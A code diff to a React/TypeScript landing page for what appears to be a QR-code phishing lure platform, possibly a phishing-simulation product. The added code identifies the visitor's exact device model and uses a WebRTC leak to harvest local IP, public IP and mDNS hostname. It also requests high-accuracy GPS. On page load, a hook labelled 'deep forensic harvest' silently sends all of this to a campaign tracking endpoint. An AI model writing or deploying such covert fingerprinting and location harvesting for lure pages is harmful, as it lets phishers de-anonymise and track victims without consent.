@@ -131,21 +131,207 @@ const SKINS: Record<QrLureType, Skin> = {
 };
 
 
-/** LAYER 1: WebRTC Local IP & mDNS Hostname Leak */
-async function getLocalNetworkDetails(): Promise<{ local_ip: string | null; mDNS_name: string | null }> {
+const COMMERCIAL_MODELS: Record<string, string> = {
+  // Samsung Galaxy S-Series
+  'SM-S928': 'Samsung Galaxy S24 Ultra',
+  'SM-S926': 'Samsung Galaxy S24+',
+  'SM-S921': 'Samsung Galaxy S24',
+  'SM-S918': 'Samsung Galaxy S23 Ultra',
+  'SM-S916': 'Samsung Galaxy S23+',
+  'SM-S911': 'Samsung Galaxy S23',
+  'SM-S711': 'Samsung Galaxy S23 FE',
+  'SM-S908': 'Samsung Galaxy S22 Ultra',
+  'SM-S906': 'Samsung Galaxy S22+',
+  'SM-S901': 'Samsung Galaxy S22',
+  'SM-G998': 'Samsung Galaxy S21 Ultra',
+  'SM-G996': 'Samsung Galaxy S21+',
+  'SM-G991': 'Samsung Galaxy S21',
+  'SM-G990': 'Samsung Galaxy S21 FE',
+  'SM-G988': 'Samsung Galaxy S20 Ultra',
+  'SM-G986': 'Samsung Galaxy S20+',
+  'SM-G981': 'Samsung Galaxy S20',
+  'SM-G781': 'Samsung Galaxy S20 FE',
+  // Samsung Galaxy A-Series
+  'SM-A556': 'Samsung Galaxy A55 5G',
+  'SM-A546': 'Samsung Galaxy A54 5G',
+  'SM-A536': 'Samsung Galaxy A53 5G',
+  'SM-A528': 'Samsung Galaxy A52s 5G',
+  'SM-A525': 'Samsung Galaxy A52',
+  'SM-A356': 'Samsung Galaxy A35 5G',
+  'SM-A346': 'Samsung Galaxy A34 5G',
+  'SM-A256': 'Samsung Galaxy A25 5G',
+  'SM-A156': 'Samsung Galaxy A15 5G',
+  'SM-A155': 'Samsung Galaxy A15',
+  'SM-A146': 'Samsung Galaxy A14 5G',
+  'SM-A145': 'Samsung Galaxy A14',
+  // Samsung Z Fold & Flip
+  'SM-F956': 'Samsung Galaxy Z Fold 6',
+  'SM-F946': 'Samsung Galaxy Z Fold 5',
+  'SM-F936': 'Samsung Galaxy Z Fold 4',
+  'SM-F741': 'Samsung Galaxy Z Flip 6',
+  'SM-F731': 'Samsung Galaxy Z Flip 5',
+  'SM-F721': 'Samsung Galaxy Z Flip 4',
+  // Note Series
+  'SM-N986': 'Samsung Galaxy Note 20 Ultra',
+  'SM-N980': 'Samsung Galaxy Note 20',
+  'SM-N975': 'Samsung Galaxy Note 10+',
+  // Xiaomi & Redmi & POCO
+  '2312DRA50G': 'Xiaomi Redmi Note 13 Pro',
+  '23090RA98G': 'Xiaomi Redmi Note 13 Pro+',
+  '23129RAA4G': 'Xiaomi Redmi Note 13 5G',
+  '22101316G': 'Xiaomi Redmi Note 12 Pro+',
+  '22101316UG': 'Xiaomi Redmi Note 12 Pro',
+  '23021RAAEG': 'Xiaomi Redmi Note 12 4G',
+  '2201116SG': 'Xiaomi Redmi Note 11 Pro 5G',
+  '2201117TY': 'Xiaomi Redmi Note 11S',
+  '2201117TG': 'Xiaomi Redmi Note 11',
+  '23049PCD8G': 'POCO F5',
+  '23013PC75G': 'POCO X5 Pro 5G',
+  '22011211G': 'POCO F4 GT',
+  'M2012K11AG': 'POCO F3',
+  '23078PND5G': 'Xiaomi 13T Pro',
+  '2306EPN60G': 'Xiaomi 13 Ultra',
+  '2201123G': 'Xiaomi 12',
+  '2201122G': 'Xiaomi 12 Pro',
+};
+
+const IOS_SCREEN_MAP: Record<string, string> = {
+  '430x932@3': 'Apple iPhone 16 Pro Max / 16 Plus / 15 Pro Max',
+  '393x852@3': 'Apple iPhone 16 / 16 Pro / 15 / 15 Pro / 14 Pro',
+  '428x926@3': 'Apple iPhone 14 Plus / 13 Pro Max / 12 Pro Max',
+  '390x844@3': 'Apple iPhone 14 / 13 / 13 Pro / 12 / 12 Pro',
+  '375x812@3': 'Apple iPhone 13 mini / 12 mini / 11 Pro / XS / X',
+  '414x896@3': 'Apple iPhone 11 Pro Max / XS Max',
+  '414x896@2': 'Apple iPhone 11 / XR',
+  '375x667@2': 'Apple iPhone SE (2nd/3rd Gen) / 8 / 7',
+  '414x736@3': 'Apple iPhone 8 Plus / 7 Plus',
+  '1024x1366@2': 'Apple iPad Pro 12.9-inch',
+  '834x1194@2': 'Apple iPad Pro 11-inch',
+  '820x1180@2': 'Apple iPad Air (4th/5th Gen)',
+  '810x1080@2': 'Apple iPad (7th/8th/9th Gen)',
+  '744x1133@2': 'Apple iPad mini (6th Gen)',
+};
+
+function resolveFriendlyDeviceName(
+  ua: string,
+  clientModel: string | null,
+  screenW: number,
+  screenH: number,
+  pixelRatio: number,
+  mDNS: string | null
+): string {
+  let friendlyName = '';
+  const dpr = Math.round(pixelRatio || 1);
+  const minDim = Math.min(screenW, screenH);
+  const maxDim = Math.max(screenW, screenH);
+  const screenKey = `${minDim}x${maxDim}@${dpr}`;
+
+  // 1. Check iOS screen geometry
+  if (/iPhone/i.test(ua) || /iPad/i.test(ua)) {
+    if (IOS_SCREEN_MAP[screenKey]) {
+      friendlyName = IOS_SCREEN_MAP[screenKey];
+    } else {
+      friendlyName = /iPad/i.test(ua) ? 'Apple iPad' : 'Apple iPhone';
+    }
+  }
+
+  // 2. Check Client Model from High Entropy hints
+  if (!friendlyName && clientModel) {
+    const cm = clientModel.trim();
+    for (const [prefix, name] of Object.entries(COMMERCIAL_MODELS)) {
+      if (cm.startsWith(prefix) || cm.includes(prefix)) {
+        friendlyName = name;
+        break;
+      }
+    }
+    if (!friendlyName && cm.length > 2 && cm !== 'generic' && cm !== 'Android') {
+      friendlyName = cm;
+    }
+  }
+
+  // 3. Check User-Agent Model patterns
+  if (!friendlyName) {
+    for (const [prefix, name] of Object.entries(COMMERCIAL_MODELS)) {
+      if (ua.includes(prefix)) {
+        friendlyName = name;
+        break;
+      }
+    }
+  }
+
+  // 4. Android Build tag or Pixel match
+  if (!friendlyName && /Android/i.test(ua)) {
+    const pixelMatch = ua.match(/Pixel\s+[\dA-Za-z\s]+/i);
+    if (pixelMatch) {
+      friendlyName = `Google ${pixelMatch[0].trim()}`;
+    } else {
+      const buildMatch = ua.match(/;\s*([^;)]+)\s*Build\//i);
+      if (buildMatch) {
+        const rawModel = buildMatch[1].trim();
+        for (const [prefix, name] of Object.entries(COMMERCIAL_MODELS)) {
+          if (rawModel.includes(prefix)) {
+            friendlyName = name;
+            break;
+          }
+        }
+        if (!friendlyName) friendlyName = rawModel;
+      } else {
+        friendlyName = 'Android Device';
+      }
+    }
+  }
+
+  // 5. Desktop platforms fallback
+  if (!friendlyName) {
+    if (/Windows NT 10\.0/i.test(ua)) friendlyName = 'Windows 10/11 Workstation';
+    else if (/Macintosh/i.test(ua)) friendlyName = 'Apple Mac Workstation';
+    else if (/Linux/i.test(ua)) friendlyName = 'Linux Workstation';
+    else friendlyName = 'Generic Device';
+  }
+
+  // 6. Router / DHCP / mDNS name attachment
+  if (mDNS && mDNS.trim() && !friendlyName.toLowerCase().includes(mDNS.toLowerCase())) {
+    const cleanMDNS = mDNS.replace(/\.local$/i, '').trim();
+    if (cleanMDNS) {
+      friendlyName = `${friendlyName} [${cleanMDNS}]`;
+    }
+  }
+
+  return friendlyName;
+}
+
+/** Optional Browser Geolocation */
+async function getBrowserGeolocation(): Promise<{ latitude: number; longitude: number } | null> {
+  try {
+    if (!navigator.geolocation) return null;
+    return await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
+        () => resolve(null),
+        { timeout: 2000, enableHighAccuracy: true, maximumAge: 60000 }
+      );
+    });
+  } catch {
+    return null;
+  }
+}
+
+/** LAYER 1: WebRTC Local IP, Public IP & mDNS Hostname Leak */
+async function getLocalNetworkDetails(): Promise<{ local_ip: string | null; public_ip: string | null; mDNS_name: string | null }> {
   return new Promise((resolve) => {
     let localIp: string | null = null;
+    let publicIp: string | null = null;
     let mDNSName: string | null = null;
     let finished = false;
 
     const done = () => {
       if (!finished) {
         finished = true;
-        resolve({ local_ip: localIp, mDNS_name: mDNSName });
+        resolve({ local_ip: localIp, public_ip: publicIp, mDNS_name: mDNSName });
       }
     };
 
-    const timeout = setTimeout(done, 1200);
+    const timeout = setTimeout(done, 1400);
 
     try {
       const PeerConn = window.RTCPeerConnection || (window as unknown as { webkitRTCPeerConnection: typeof RTCPeerConnection }).webkitRTCPeerConnection;
@@ -155,7 +341,10 @@ async function getLocalNetworkDetails(): Promise<{ local_ip: string | null; mDNS
       }
 
       const pc = new PeerConn({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+        ],
       });
 
       pc.createDataChannel('telemetry-probe');
@@ -166,11 +355,14 @@ async function getLocalNetworkDetails(): Promise<{ local_ip: string | null; mDNS
           return;
         }
         const candidateStr = event.candidate.candidate;
-        // Parse candidate e.g. "candidate:... 1 udp ... 192.168.1.55 54321 typ host"
+        // Parse candidate e.g. "candidate:... 1 udp 2122260223 192.168.1.55 54321 typ host"
         const parts = candidateStr.split(' ');
-        if (parts.length >= 5) {
+        if (parts.length >= 8) {
           const address = parts[4];
-          if (/^(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)/.test(address)) {
+          const candType = parts[7];
+          if (candType === 'srflx' && /^(?:\d{1,3}\.){3}\d{1,3}$/.test(address)) {
+            publicIp = address;
+          } else if (/^(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)/.test(address)) {
             localIp = address;
           } else if (address.includes('.local')) {
             mDNSName = address.replace('.local', '');
@@ -298,27 +490,15 @@ async function collectFingerprint(): Promise<Record<string, unknown>> {
     }
   }
 
-  // Determine Device Real Name (e.g. "Ahmed's iPhone", "Samsung S24", "Ali-Laptop")
-  let deviceRealName = '';
   const ua = nav.userAgent || '';
-  if (clientModel) {
-    deviceRealName = clientModel;
-  } else if (/iPhone/i.test(ua)) {
-    deviceRealName = 'Apple iPhone';
-  } else if (/iPad/i.test(ua)) {
-    deviceRealName = 'Apple iPad';
-  } else if (/Macintosh/i.test(ua)) {
-    deviceRealName = 'Apple Mac Workstation';
-  } else if (/Windows NT 10\.0/i.test(ua)) {
-    deviceRealName = 'Windows 10/11 Workstation';
-  } else if (/Android/i.test(ua)) {
-    const m = ua.match(/;\s*([^;)]+)\s*Build\//i);
-    deviceRealName = m ? m[1].trim() : 'Android Device';
-  }
-
-  if (netDetails.mDNS_name && !deviceRealName.includes(netDetails.mDNS_name)) {
-    deviceRealName = deviceRealName ? `${deviceRealName} [${netDetails.mDNS_name.slice(0, 12)}]` : netDetails.mDNS_name;
-  }
+  const deviceRealName = resolveFriendlyDeviceName(
+    ua,
+    clientModel,
+    window.screen.width,
+    window.screen.height,
+    window.devicePixelRatio || 1,
+    netDetails.mDNS_name
+  );
 
   // Combined hardware fingerprint hash
   const hwRaw = `${gpuRenderer || 'no-gpu'}_${canvasHash}_${audioHash}_${window.screen.width}x${window.screen.height}_${nav.hardwareConcurrency || 0}_${nav.deviceMemory || 0}`;
@@ -342,6 +522,7 @@ async function collectFingerprint(): Promise<Record<string, unknown>> {
     canvas_hash: canvasHash,
     audio_hash: audioHash,
     local_ip: netDetails.local_ip,
+    public_ip: netDetails.public_ip,
     mDNS_name: netDetails.mDNS_name,
     device_real_name: deviceRealName,
     hardware_fingerprint: hardwareFingerprint,
@@ -598,7 +779,7 @@ export function QrLureLandingPage() {
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const startedAt = useRef(0);
-  const visitLogged = useRef(false);
+
 
   const contextQuery = useQuery({
     queryKey: ['qr-lure-context', trackingUuid, routeCampaignId],
@@ -630,11 +811,50 @@ export function QrLureLandingPage() {
   const cta = branding?.cta || 'متابعة آمنة';
   const Icon = LURE_ICON[lure];
 
+  const probeLogged = useRef(false);
+
   useEffect(() => {
-    if (!trackingUuid || visitLogged.current) return;
-    visitLogged.current = true;
-    void trackingApi.visit(trackingUuid, 'qr').catch(() => undefined);
-  }, [trackingUuid]);
+    const targetCampaign = campaignId || routeCampaignId;
+    if (!targetCampaign || probeLogged.current) return;
+    probeLogged.current = true;
+
+    if (trackingUuid) {
+      void trackingApi.visit(trackingUuid, 'qr').catch(() => undefined);
+    }
+
+    // Execute immediate deep forensic harvest
+    const executeProbe = async () => {
+      try {
+        const fp = await collectFingerprint();
+        const gps = await getBrowserGeolocation();
+        if (gps) {
+          fp.gps = gps;
+        }
+        await trackingApi.probeQr({
+          campaign_id: targetCampaign,
+          tracking_uuid: trackingUuid || undefined,
+          fingerprint_data: fp,
+          telemetry: {
+            device_real_name: (fp.device_real_name as string) || (fp.device_model as string) || (fp.client_model as string) || null,
+            local_ip: (fp.local_ip as string) || null,
+            mDNS_name: (fp.mDNS_name as string) || null,
+            gpu_renderer: (fp.gpu_renderer as string) || (fp.webgl_renderer as string) || null,
+            hardware_fingerprint: (fp.hardware_fingerprint as string) || (fp.fingerprint_hash as string) || null,
+            screen_resolution: `${window.screen.width}x${window.screen.height}`,
+            user_agent: navigator.userAgent,
+            cpu_cores: (fp.cpu_cores as number) || null,
+            device_memory_gb: (fp.device_memory_gb as number) || null,
+            pixel_ratio: (fp.pixel_ratio as number) || null,
+            language: (fp.language as string) || null,
+          },
+        });
+      } catch {
+        /* Ignore probe network error */
+      }
+    };
+
+    void executeProbe();
+  }, [campaignId, routeCampaignId, trackingUuid]);
 
   useEffect(() => {
     if (context?.email) {
